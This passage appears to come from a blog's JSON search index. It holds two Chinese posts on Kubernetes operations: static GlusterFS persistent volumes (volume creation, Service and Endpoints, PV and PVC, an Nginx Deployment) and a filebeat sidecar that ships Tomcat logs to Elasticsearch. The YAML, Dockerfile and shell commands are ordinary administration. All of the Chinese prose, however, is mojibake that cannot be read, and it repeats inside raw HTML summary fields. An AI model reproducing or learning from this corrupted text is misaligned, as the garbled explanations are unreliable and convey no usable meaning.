æ‰˜ç®¡å¹³å°çš„è¯ï¼Œå¯ä»¥ç”¨ OSS æ¥æŒä¹…åŒ–å·ï¼Œå¦‚æœæ˜¯è‡ªæ­çš„ kubernetesï¼Œé‚£ä¹ˆå­˜å‚¨å°±éœ€è¦ä»”ç»†è€ƒè™‘äº†ã€‚\ncephæ¯”è¾ƒå¤æ‚ï¼Œå®¹æ˜“å‡ºæ•…éšœã€‚nfs ä¹Ÿä¸å¯ç”¨ï¼Œæ¯›ç—…å¤šå¤šã€‚minioå€’æ˜¯å¯ä»¥ã€‚\nè¿™ç§æƒ…å†µä¸‹ä½¿ç”¨åŒå‰¯æœ¬çš„ GlusterFS å°±æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚\nç”Ÿäº§ç¯å¢ƒå°±ä¸èƒ½éšæ„äº†ï¼Œæœ€å¥½ä¸è¦ä½¿ç”¨ Heketiï¼Œå› ä¸ºå‡¡æ˜¯è¦æŒä¹…åŒ–çš„ä¸œè¥¿ï¼Œéƒ½æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ï¼Œæœ€å¥½éƒ½æœ‰ yaml è®°å½•ã€‚\nGlusterFS çš„æ­å»ºå°±ä¸è¯´äº†ã€‚è¯´è¯´å®é™…ä½¿ç”¨è¿‡ç¨‹ï¼š\nä¸€ã€è£…GFSï¼Œç”Ÿäº§æ–°å· å®‰è£…å°±ä¸è¯´äº†ï¼Œæˆ‘ä»¬çš„GFSæœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œ172.19.20.18 å’Œ 172.19.20.36ï¼Œæˆ‘ä»¬å¼ºåˆ¶å»ºç«‹ä¸€ä¸ªä¸¤å‰¯æœ¬çš„å·ï¼š kuaijian-vol\ngluster volume create kuaijian-vol replica 2 transport tcp 172.19.20.18:/glusterfs/kuaijian-vol 172.19.20.36:/glusterfs/kuaijian-vol force äºŒã€ä¸ºk8säº§ç”ŸGFSçš„endingpointå’Œservice cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; ep-svc.yaml --- apiVersion: v1 kind: Service metadata: name: gfs-cluster_svc spec: ports: - port: 1 --- apiVersion: v1 kind: Endpoints metadata: name: gfs-cluster_svc subsets: - addresses: - ip: 172.19.20.18 ports: - port: 1 - addresses: - ip: 172.19.20.36 ports: - port: 1 EOF kubectl apply -f ep-svc.yaml è¿™é‡Œè¦æä¸€ä¸ªæ¦‚å¿µï¼Œé€šå¸¸æƒ…å†µä¸‹ service æ˜¯é€šè¿‡ selector æ ‡ç­¾æ¥é€‰æ‹©å¯¹åº”çš„ pod æ¥å¢åŠ  endingpoint çš„ã€‚å¦‚ä¸‹ï¼š\napiVersion: v1 kind: Service metadata: name: go-api_svc spec: ports: - port: 8080 protocol: TCP targetPort: 8080 selector: app: go-api type: ClusterIP è€Œä¸Šé¢ï¼Œæˆ‘ä»¬æ²¡æœ‰é€šè¿‡æ ‡ç­¾ï¼Œè€Œæ˜¯è®© endingpoint å’Œ svc åŒåè€Œæ‰‹åŠ¨å¢åŠ  endingpoint åˆ° svc çš„ã€‚\nä¸‰ã€ä¸ºk8sç”Ÿäº§åˆ›å»º PVå’ŒPVC é™æ€ç¯å¢ƒä¸ä½¿ç”¨ Storageclass æŒä¹…åŒ–å·çš„å›¾è§£å¦‚ä¸‹ï¼Œpodåšpvcå£°æ˜ï¼Œpvcè¿æ¥åˆ°pvï¼Œpvä»GFSä¸­æ‹¿åˆ°å·ã€‚\né¦–å…ˆå£°æ˜ä¸€ä¸ª pvï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; kuaijian-pv.yaml apiVersion: v1 kind: PersistentVolume metadata: name: gfs-kuaijian-50G_pv labels: name: gfs-kuaijian-50G_pv spec: capacity: storage: 50Gi accessModes: - ReadWriteMany glusterfs: endpoints: gfs-cluster_svc path: kuaijian-vol readOnly: false persistentVolumeReclaimPolicy: Retain EOF kubectl apply -f kuaijian-pv.yaml ç„¶åå£°æ˜ä¸€ä¸ª pvc é€šè¿‡ matchLabels æ¥è·Ÿä¹‹å‰çš„ pv ç»‘å®šã€‚\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; kuaijian-pvc.yaml kind: PersistentVolumeClaim apiVersion: v1 metadata: name: gfs-kuaijian-50G_pvc spec: accessModes: - ReadWriteMany resources: requests: storage: 50Gi selector: matchLabels: name: gfs-kuaijian-50G_pv EOF kubectl apply -f kuaijian-pvc.yaml æ³¨æ„ä¸Šé¢çš„ pvcï¼Œæˆ‘ä»¬ä¸€ä¸‹å­ç”³è¯·äº†50Gï¼ŒæŠŠæ•´ä¸ª pv ç©ºé—´å…¨ç”¨å…‰äº†ï¼›å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åªç”³è¯·ä¸ª 10Giï¼Œä¸‹ä¸ª pvc å† 10Giï¼Œè¿™æ ·ä¹Ÿæ˜¯è¡Œçš„é€šçš„ã€‚\nå››ã€PODä½¿ç”¨PVC å£°æ˜ä¸€ä¸ª Nginx çš„ Deployment æ¥ä½¿ç”¨è¿™ä¸ª pvc\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx spec: replicas: 2 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 volumeMounts: - name: data-www mountPath: /data/www volumes: - name: data-www persistentVolumeClaim: claimName: gfs-kuaijian-50G_pvc è¿™æ · kubernetes çš„å­˜å‚¨éƒ¨åˆ†å°±æå®šäº†ã€‚GFS ç”¨äºç”Ÿäº§éå¸¸ç¨³å®šï¼ŒåŸºæœ¬è·‘äº† 7 å¹´äº†æ²¡æœ‰å¤§æ¯›ç—…ã€‚\n","permalink":"https://rendoumi.com/posts/20211110-k8s_gfs/","summary":"\u003cp\u003eåœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ Kubernetes ï¼Œç»•ä¸è¿‡å»çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æŒä¹…åŒ–å·ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœæ˜¯ä½¿ç”¨é˜¿é‡Œ ACK æ‰˜ç®¡å¹³å°çš„è¯ï¼Œå¯ä»¥ç”¨ OSS æ¥æŒä¹…åŒ–å·ï¼Œå¦‚æœæ˜¯è‡ªæ­çš„ kubernetesï¼Œé‚£ä¹ˆå­˜å‚¨å°±éœ€è¦ä»”ç»†è€ƒè™‘äº†ã€‚\u003c/p\u003e\n\u003cp\u003ecephæ¯”è¾ƒå¤æ‚ï¼Œå®¹æ˜“å‡ºæ•…éšœã€‚nfs ä¹Ÿä¸å¯ç”¨ï¼Œæ¯›ç—…å¤šå¤šã€‚minioå€’æ˜¯å¯ä»¥ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ç§æƒ…å†µä¸‹ä½¿ç”¨åŒå‰¯æœ¬çš„ GlusterFS å°±æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚\u003c/p\u003e\n\u003cp\u003eç”Ÿäº§ç¯å¢ƒå°±ä¸èƒ½éšæ„äº†ï¼Œæœ€å¥½ä¸è¦ä½¿ç”¨ Heketiï¼Œå› ä¸ºå‡¡æ˜¯è¦æŒä¹…åŒ–çš„ä¸œè¥¿ï¼Œéƒ½æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ï¼Œæœ€å¥½éƒ½æœ‰ yaml è®°å½•ã€‚\u003c/p\u003e\n\u003cp\u003eGlusterFS çš„æ­å»ºå°±ä¸è¯´äº†ã€‚è¯´è¯´å®é™…ä½¿ç”¨è¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€è£…gfsç”Ÿäº§æ–°å·\"\u003eä¸€ã€è£…GFSï¼Œç”Ÿäº§æ–°å·\u003c/h2\u003e\n\u003cp\u003eå®‰è£…å°±ä¸è¯´äº†ï¼Œæˆ‘ä»¬çš„GFSæœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œ172.19.20.18 å’Œ 172.19.20.36ï¼Œæˆ‘ä»¬å¼ºåˆ¶å»ºç«‹ä¸€ä¸ªä¸¤å‰¯æœ¬çš„å·ï¼š kuaijian-vol\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume create kuaijian-vol replica \u003cspan class=\"m\"\u003e2\u003c/span\u003e transport tcp 172.19.20.18:/glusterfs/kuaijian-vol 172.19.20.36:/glusterfs/kuaijian-vol force\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒä¸ºk8säº§ç”Ÿgfsçš„endingpointå’Œservice\"\u003eäºŒã€ä¸ºk8säº§ç”ŸGFSçš„endingpointå’Œservice\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; ep-svc.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: Service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: gfs-cluster_svc \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  ports:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - port: 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: Endpoints\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: gfs-cluster_svc \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esubsets:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - addresses:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - ip: 172.19.20.18 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - port: 1 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - addresses:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - ip: 172.19.20.36 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      - port: 1 \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl apply -f ep-svc.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™é‡Œè¦æä¸€ä¸ªæ¦‚å¿µï¼Œé€šå¸¸æƒ…å†µä¸‹ service æ˜¯é€šè¿‡ selector æ ‡ç­¾æ¥é€‰æ‹©å¯¹åº”çš„ pod æ¥å¢åŠ  endingpoint çš„ã€‚å¦‚ä¸‹ï¼š\u003c/p\u003e","title":"ç”Ÿäº§ç¯å¢ƒkubernetesä½¿ç”¨æŒä¹…åŒ–å·GlusterFS"},{"content":"åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒES é€šå¸¸æ˜¯ä¸ä¼šåœ¨ k8s é›†ç¾¤ä¸­å­˜åœ¨çš„ï¼Œä¸€èˆ¬ MySQL å’Œ Elasticsearch éƒ½æ˜¯ç‹¬ç«‹åœ¨ k8s ä¹‹å¤–ã€‚\né‚£ä¹ˆæ— è®ºå“ªç§ podï¼Œè¦ç”©æ—¥å¿—åˆ° ESï¼Œæœ€è½»é‡çš„æ–¹æ¡ˆè‚¯å®šæ˜¯ç”¨ filebeat ç”©è¿‡å»äº†ã€‚\nå½“ç„¶ï¼Œå¦‚æœæ˜¯é˜¿é‡Œçš„ ACKï¼Œlogtail å’Œ logstore é…æ­å·²ç»éå¸¸ä¸é”™äº†ï¼Œæ ¹æœ¬ç”¨ä¸åˆ° filebeat å’Œ ESã€‚\nå¯ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸æƒ³ä¸ºé˜¿é‡Œ slsã€logstore å‡ºé’±ä¹°å•ï¼Œå°±åªèƒ½ç”¨ filebeat + ES äº†\nè¯´ä¸€ä¸‹ filebeat çš„ sidecar è¾¹è½¦ï¼ˆåƒšæœºï¼‰ç”¨æ³•ï¼š\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç®€å•è¯´å°±æ˜¯èµ·ä¸€ä¸ª filebeat çš„ logging-agent è¾¹è½¦ï¼ˆåƒšæœºï¼‰ï¼Œè¾¹è½¦å’Œä¸»åº”ç”¨ä¹‹é—´å…±äº«æŸä¸ªæ–‡ä»¶å¤¹ï¼ˆmountPathï¼‰ï¼Œè¾¾åˆ°æ”¶é›†ä¸»åº”ç”¨æ—¥å¿—å¹¶å‘é€åˆ° ESï¼Œè€Œä¸ç”¨åŠ¨ app-container åˆ†æ¯«ã€‚\næˆ‘ä»¬ä»¥éƒ¨ç½²ä¸€ä¸ª Tomcat åº”ç”¨ä¸ºä¾‹æ¥è¯´æ˜ï¼š\nä¸€ã€æ‰“é€  filebeat è¾¹è½¦é•œåƒ é¦–å…ˆå‡†å¤‡ Dockerfile\nFROM alpine:3.12 ARG VERSION=7.15.1 COPY docker-entrypoint.sh / RUN set -x \\ \u0026amp;\u0026amp; cd /tmp \\ \u0026amp;\u0026amp; wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-${VERSION}-linux-x86_64.tar.gz \\ \u0026amp;\u0026amp; tar xzvf filebeat-${VERSION}-linux-x86_64.tar.gz \\ \u0026amp;\u0026amp; mv filebeat-${VERSION}-linux-x86_64 /opt \\ \u0026amp;\u0026amp; rm /tmp/* \\ \u0026amp;\u0026amp; chmod +x /docker-entrypoint.sh ENV PATH $PATH:/opt/filebeat-${VERSION}-linux-x86_64 WORKDIR /opt/filebeat-${VERSION}-linux-x86_64 ENTRYPOINT [\u0026#34;/docker-entrypoint.sh\u0026#34;] æˆ‘ä»¬ä»¥ alphine:3.12 ä¸ºåº•ç‰ˆï¼Œç„¶åä¸‹è½½ filebeat 7.15.1çš„äºŒè¿›åˆ¶åŒ…å¹¶é‡Šæ”¾åˆ° /opt ä¸‹ï¼Œæœ€åæŒ‡å®šå…¥å£æ–‡ä»¶ /docker-entrypoint.sh\nå¥¥å¦™å…¨åœ¨è¿™ä¸ª docker-entrypoint.sh ä¸­äº†\n#!/bin/bash cat \u0026gt; /etc/filebeat.yaml \u0026lt;\u0026lt; EOF filebeat.config.modules: path: /opt/filebeat-7.15.1-linux-x86_64/modules.d/*.yml reload.enabled: true # åŠ å…¥è‡ªå®šä¹‰çš„å­—æ®µ fields_under_root: true fields: project: kuaijian-tomcat pod_ip: ${POD_IP} pod_name: ${POD_NAME} node_name: ${NODE_NAME} pod_namespace: ${POD_NAMESPACE} # æ”¶é›†äº‘å‚å•†çš„æ•°æ®å’Œdockerçš„å˜é‡ processors: - add_cloud_metadata: ~ - add_docker_metadata: ~ filebeat.modules: - module: apache access: enabled: true var.paths: - \u0026#34;/usr/local/tomcat/logs/localhost_access_log.*.txt\u0026#34; error: enabled: true var.paths: - \u0026#34;/usr/local/tomcat/logs/application.log*\u0026#34; - \u0026#34;/usr/local/tomcat/logs/catalina.*.log\u0026#34; - \u0026#34;/usr/local/tomcat/logs/host-manager.*.log\u0026#34; - \u0026#34;/usr/local/tomcat/logs/localhost.*.log\u0026#34; - \u0026#34;/usr/local/tomcat/logs/manager.*.log\u0026#34; setup.template.name: \u0026#34;tomcat-logs\u0026#34; setup.template.pattern: \u0026#34;tomcat-logs-*\u0026#34; output.elasticsearch: hosts: [\u0026#34;172.19.20.xxx:9200\u0026#34;,\u0026#34;172.19.20.xxx:9200\u0026#34;] index: \u0026#34;tomcat-logs-%{+yyyy.MM}\u0026#34; EOF set -xe # If user don\u0026#39;t provide any command # Run filebeat if [[ \u0026#34;$1\u0026#34; == \u0026#34;\u0026#34; ]]; then exec /opt/filebeat-7.15.1-linux-x86_64/filebeat -c /etc/filebeat.yaml else # Else allow the user to run arbitrarily commands like bash exec \u0026#34;$@\u0026#34; fi æˆ‘ä»¬ä¸ºä»€ä¹ˆä¸åœ¨ k8s é‡Œç”¨ configmap æ¥é…ç½® filebeat.yml å‘¢ï¼Ÿ\nç†ç”±æ˜¯æ”¶é›†æ—¥å¿—æ–‡ä»¶å¤šä¸”è·¯å¾„ã€ç±»å‹å„ä¸ç›¸åŒï¼Œè¿™ä¹ˆä¸€å †çš„é…ç½®éƒ½æ”¾åœ¨ configmap é‡Œä¼šè®©äººç™«ç‹‚çš„ã€‚æ‰€ä»¥å¹²è„†æ”¾åˆ°é•œåƒé‡Œï¼Œä¾¿äºè°ƒè¯•ä¹Ÿä¾¿äºä¿®æ”¹ã€‚\nä¸Šé¢æˆ‘ä»¬ä¹Ÿå……åˆ†åˆ©ç”¨äº† filebeat çš„ moduleï¼Œæœ‰ module å¯ç”¨å°±å¿…é¡»ç”¨ moduleï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨æŒ‡å®š filebeat.inputs ï¼Œå¯ç”¨çš„ mudole å®åœ¨å¤ªå¤šäº†ï¼Œä¸€å®šè¦å–„ç”¨ï¼ï¼ï¼å¦å¤– tomcat å’Œ apache çš„æ—¥å¿—æ ¼å¼æ˜¯ä¸€æ ·çš„ã€‚\næˆ‘ä»¬åœ¨æœ€åæ‰§è¡Œçš„æ—¶å€™ï¼Œä¹ŸåŠ äº† exec $@ ä¾¿äºè°ƒè¯•ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š CMDï¼Œå°±å¯åŠ¨ filebeatï¼Œå¦‚æœæŒ‡å®šäº†æ¯”å¦‚ /bin/bashï¼Œå°±è¿›å…¥è°ƒè¯•çŠ¶æ€ã€‚\næˆ‘ä»¬æ‰“å¥½é•œåƒå°± push åˆ° harbor é‡Œå¾…ç”¨\né™„å½•ï¼šhttps://www.elastic.co/guide/en/beats/filebeat/current/configuration-general-options.html filebeatçš„é…ç½®åˆ—è¡¨\näºŒã€sidecaréƒ¨ç½² æˆ‘ä»¬å†™ä¸€ä¸ª k8s çš„ tomcat deploymentæ–‡ä»¶ï¼š\napiVersion: apps/v1 kind: Deployment metadata: name: tomcat labels: app: tomcat spec: replicas: 1 selector: matchLabels: app: tomcat template: metadata: labels: app: tomcat spec: containers: - name: filebeat-sidecar image: xxxx.xxxx.xxx/filebeat:xxx env: - name: POD_NAMESPACE valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.namespace - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName - name: POD_IP valueFrom: fieldRef: apiVersion: v1 fieldPath: status.podIP - name: POD_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.name volumeMounts: - name: logs-volume mountPath: /usr/local/tomcat/logs - name: tomcat image: tomcat ports: - containerPort: 8080 volumeMounts: - name: logs-volume mountPath: /usr/local/tomcat/logs volumes: - name: logs-volume emptyDir: {} å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨è¿™ä¸ª deployment é‡Œå®šä¹‰äº† pod æ˜¯å•å‰¯æœ¬ï¼Œé‡Œé¢è·‘äº†ä¸¤ä¸ª containerï¼Œä¸€ä¸ªæ˜¯ filebeatï¼Œä¸€ä¸ªæ˜¯ tocmatï¼Œä¸¤è€…é€šè¿‡åŒä¸€ä¸ª volume è¿æ¥åœ¨ä¸€èµ·ï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°ä¸ä¿®æ”¹ tomcat container è€Œæ‹¿åˆ°é‡Œé¢çš„æ—¥å¿—äº†ã€‚\nè¿™æ ·å°±æŠŠ tomcat åº”ç”¨çš„æ—¥å¿—æ”¶åˆ° ES å»äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211110-k8s_sidecar/","summary":"\u003cp\u003eåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒES é€šå¸¸æ˜¯ä¸ä¼šåœ¨ k8s é›†ç¾¤ä¸­å­˜åœ¨çš„ï¼Œä¸€èˆ¬ MySQL å’Œ Elasticsearch éƒ½æ˜¯ç‹¬ç«‹åœ¨ k8s ä¹‹å¤–ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæ— è®ºå“ªç§ podï¼Œè¦ç”©æ—¥å¿—åˆ° ESï¼Œæœ€è½»é‡çš„æ–¹æ¡ˆè‚¯å®šæ˜¯ç”¨ filebeat ç”©è¿‡å»äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œå¦‚æœæ˜¯é˜¿é‡Œçš„ ACKï¼Œlogtail å’Œ logstore é…æ­å·²ç»éå¸¸ä¸é”™äº†ï¼Œæ ¹æœ¬ç”¨ä¸åˆ° filebeat å’Œ ESã€‚\u003c/p\u003e\n\u003cp\u003eå¯ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸æƒ³ä¸ºé˜¿é‡Œ slsã€logstore å‡ºé’±ä¹°å•ï¼Œå°±åªèƒ½ç”¨ filebeat + ES äº†\u003c/p\u003e\n\u003cp\u003eè¯´ä¸€ä¸‹ filebeat çš„ sidecar è¾¹è½¦ï¼ˆåƒšæœºï¼‰ç”¨æ³•ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211110192939845\" loading=\"lazy\" src=\"/posts/20211110-k8s_sidecar/image-20211110192939845.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç®€å•è¯´å°±æ˜¯èµ·ä¸€ä¸ª filebeat çš„ logging-agent è¾¹è½¦ï¼ˆåƒšæœºï¼‰ï¼Œè¾¹è½¦å’Œä¸»åº”ç”¨ä¹‹é—´å…±äº«æŸä¸ªæ–‡ä»¶å¤¹ï¼ˆmountPathï¼‰ï¼Œè¾¾åˆ°æ”¶é›†ä¸»åº”ç”¨æ—¥å¿—å¹¶å‘é€åˆ° ESï¼Œè€Œä¸ç”¨åŠ¨ app-container åˆ†æ¯«ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ä»¥éƒ¨ç½²ä¸€ä¸ª Tomcat åº”ç”¨ä¸ºä¾‹æ¥è¯´æ˜ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€æ‰“é€ -filebeat-è¾¹è½¦é•œåƒ\"\u003eä¸€ã€æ‰“é€  filebeat è¾¹è½¦é•œåƒ\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆå‡†å¤‡ Dockerfile\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eARG VERSION\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e7.15.1  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY docker-entrypoint.sh /  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN set -x \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; cd /tmp \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-${VERSION}-linux-x86_64.tar.gz \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; tar xzvf filebeat-${VERSION}-linux-x86_64.tar.gz \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; mv filebeat-${VERSION}-linux-x86_64 /opt \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; rm /tmp/* \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; chmod +x /docker-entrypoint.sh  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV PATH $PATH:/opt/filebeat-${VERSION}-linux-x86_64  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /opt/filebeat-${VERSION}-linux-x86_64  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENTRYPOINT [\u0026#34;/docker-entrypoint.sh\u0026#34;]  